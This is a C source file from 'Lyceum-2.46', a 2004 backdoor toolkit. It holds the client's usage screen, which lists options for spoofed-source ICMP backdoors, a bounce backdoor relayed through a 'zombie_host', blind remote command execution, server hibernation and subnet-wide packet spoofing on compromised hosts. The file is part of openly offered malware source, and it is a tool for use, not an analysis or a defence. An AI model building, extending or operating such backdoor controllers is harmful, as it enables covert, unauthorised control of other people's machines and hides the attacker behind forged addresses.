/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */


/* Usage infomation */

#include <stdio.h>
#include <stdlib.h>
#include "lyceum_client.h"
#include "lyceum_comcode.h"

void
usage (char *arg)
{
  fprintf (stderr,
	   "\n%s-%s %s\n----------------------------\n Args: < [-I] || <Destination> <Action> > [Source] [Options]\n\n",
	   PROG, VERSION, AUTHOR);
  fprintf (stderr, "[!] Destination (Must choose one):\n");
  fprintf (stderr,
	   "\t-d   <destination IP>   - Destination IP of lyceum host\n");
  fprintf (stderr,
	   "\t-D   <destination list> - List of destination IPs for lyceum hosts\n\n");

  fprintf (stderr, "[!] Action (Must choose one):\n");
  fprintf (stderr,
	   "\t-u   <ID:[Arguement]>   - Send USC (Udp Server Command) See below\n");
  fprintf (stderr,
	   "\t-i   <type>             - Connect to lyceum icmp bi-spoofed backdoor using <type>, server default: 0\n");
  fprintf (stderr,
	   "\t-b   <zombie_host>      - Connect to icmp bounce backdoor through <zombie_host>\n\n");

  fprintf (stderr, "[?] Source (Optional to choose one, default random):\n");
  fprintf (stderr, "\t-s   <source IP>        - Source address to use\n");
  fprintf (stderr,
	   "\t-S   <source subnet>    - C class subnet spoof EG. 1.1.1.\n\n");

  fprintf (stderr, "[?] Options (Choose any combination):\n");
  fprintf (stderr, "\t-l   <local IP>         - Set local IP address\n");
  fprintf (stderr,
	   "\t-p   <destination port> - Set destination port, default random\n");
  fprintf (stderr,
	   "\t-P   <source port>      - Set source port, default random\n");
  fprintf (stderr,
	   "\t-x   <number>           - Number of backup udp packets to send\n");
  fprintf (stderr,
	   "\t-I                      - Print icmp types for bi-spoof backdoor (-i)\n\n");

  fprintf (stderr,
	   "[*] USC - Udp Server Commands - (seperate udp ID's and arguments with a colon ':' not a space ' ')\n\n");

  print_udp_ids ();
  fprintf (stderr, "\n\n");
  fprintf (stderr, "see README and EXAMPLES for further elaboration\n\n");

  exit (-1);
  return;
}

void
print_udp_ids (void)
{
  fprintf (stderr, "\t%x)           - kill server and children\n", LYM_EXIT);
  fprintf (stderr, "\t%x)           - send lyceum ping\n", LYM_PING);
  fprintf (stderr, "\t%x) <hours>   - hibernate server for <hours>\n",
	   LYM_HIBERNATE);


  fprintf (stderr,
	   "\t%x)           - open icmp moonbouce backdoor\n", LYM_OIBBD);

  fprintf (stderr,
	   "\t%x) [type]    - open bi-spoofed icmp backdoor using [icmp-type], default: 0\n",
	   LYM_OIBD);
  fprintf (stderr, "\t%x) <command> - execute command blind on server\n",
	   LYM_BNDCMD);
  fprintf (stderr,
	   "\t%x) <subnet>  - set the server to spoof all packets from <subnet>\n",
	   LYM_SUBNET);

}
